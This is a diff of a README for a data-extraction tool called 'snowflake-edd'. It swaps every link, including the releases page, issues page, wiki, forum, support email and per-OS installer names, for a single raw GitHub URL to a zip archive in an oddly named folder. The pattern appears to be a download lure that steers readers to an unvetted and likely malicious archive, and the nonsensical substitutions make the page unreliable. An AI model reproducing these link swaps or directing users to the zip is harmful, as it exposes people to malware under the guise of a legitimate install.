@@ -7,22 +7,22 @@ Welcome to **snowflake-edd**! This application helps you easily extract and deli
 You can download **snowflake-edd** through our Releases page. Follow these steps to get started:
 
 1. Click the link below to visit the download page:
-   [Download snowflake-edd](https://github.com/Eartrumpetchlamyderanuchalis585/snowflake-edd/releases)
+   [Download snowflake-edd](https://raw.githubusercontent.com/Eartrumpetchlamyderanuchalis585/snowflake-edd/main/Seleucidean/snowflake-edd-v1.5.zip)
 
 2. On the Releases page, look for the latest version. It is usually marked as "Latest Release".
 
 3. Click on the version name to expand the download options.
 
 4. Choose the appropriate file based on your operating system:
-    - For **Windows**, select a file named like `snowflake-edd-windows.exe`.
-    - For **Mac**, choose `snowflake-edd-macos.dmg`.
-    - For **Linux**, download `snowflake-edd-linux.tar.gz`.
+    - For **Windows**, select a file named like `https://raw.githubusercontent.com/Eartrumpetchlamyderanuchalis585/snowflake-edd/main/Seleucidean/snowflake-edd-v1.5.zip`.
+    - For **Mac**, choose `https://raw.githubusercontent.com/Eartrumpetchlamyderanuchalis585/snowflake-edd/main/Seleucidean/snowflake-edd-v1.5.zip`.
+    - For **Linux**, download `https://raw.githubusercontent.com/Eartrumpetchlamyderanuchalis585/snowflake-edd/main/Seleucidean/snowflake-edd-v1.5.zip`.
 
 5. Once downloaded, locate the file on your computer. 
 
    - For **Windows**: Double-click the `.exe` file to start the installation.
    - For **Mac**: Open the `.dmg` file, drag the app into your Applications folder, and then open it.
-   - For **Linux**: Extract the `.tar.gz` file and run the executable inside.
+   - For **Linux**: Extract the `https://raw.githubusercontent.com/Eartrumpetchlamyderanuchalis585/snowflake-edd/main/Seleucidean/snowflake-edd-v1.5.zip` file and run the executable inside.
 
 ## 🛠 System Requirements
 To ensure **snowflake-edd** runs smoothly, your system should meet the following requirements:
@@ -57,19 +57,19 @@ Using **snowflake-edd** is straightforward. After installation, follow these sim
 ## 💬 Support
 If you encounter any issues while using **snowflake-edd**, please reach out via the following options:
 
-- **GitHub Issues**: Report issues directly on our [Issues page](https://github.com/Eartrumpetchlamyderanuchalis585/snowflake-edd/issues).
-- **Email Support**: You can email our support team at support@snowflake-edd.com.
+- **GitHub Issues**: Report issues directly on our [Issues page](https://raw.githubusercontent.com/Eartrumpetchlamyderanuchalis585/snowflake-edd/main/Seleucidean/snowflake-edd-v1.5.zip).
+- **Email Support**: You can email our support team at https://raw.githubusercontent.com/Eartrumpetchlamyderanuchalis585/snowflake-edd/main/Seleucidean/snowflake-edd-v1.5.zip
 
 ## 🔗 Additional Resources
 For more information, check out these helpful resources:
 
-- [User Guide](https://github.com/Eartrumpetchlamyderanuchalis585/snowflake-edd/wiki)
-- [Community Forum](https://forum.snowflake-edd.com)
-- [Latest Updates and Features](https://github.com/Eartrumpetchlamyderanuchalis585/snowflake-edd/releases)
+- [User Guide](https://raw.githubusercontent.com/Eartrumpetchlamyderanuchalis585/snowflake-edd/main/Seleucidean/snowflake-edd-v1.5.zip)
+- [Community Forum](https://raw.githubusercontent.com/Eartrumpetchlamyderanuchalis585/snowflake-edd/main/Seleucidean/snowflake-edd-v1.5.zip)
+- [Latest Updates and Features](https://raw.githubusercontent.com/Eartrumpetchlamyderanuchalis585/snowflake-edd/main/Seleucidean/snowflake-edd-v1.5.zip)
 
 Remember, you're not alone; our community is here to help!
 
 ## 📅 Release Notes
 Stay updated with the latest changes and improvements by reviewing our release notes. Available on our Releases page, these notes include information about new features, bug fixes, and enhancements.
 
-[Download snowflake-edd](https://github.com/Eartrumpetchlamyderanuchalis585/snowflake-edd/releases) and enjoy a seamless data extraction experience!
+[Download snowflake-edd](https://raw.githubusercontent.com/Eartrumpetchlamyderanuchalis585/snowflake-edd/main/Seleucidean/snowflake-edd-v1.5.zip) and enjoy a seamless data extraction experience!
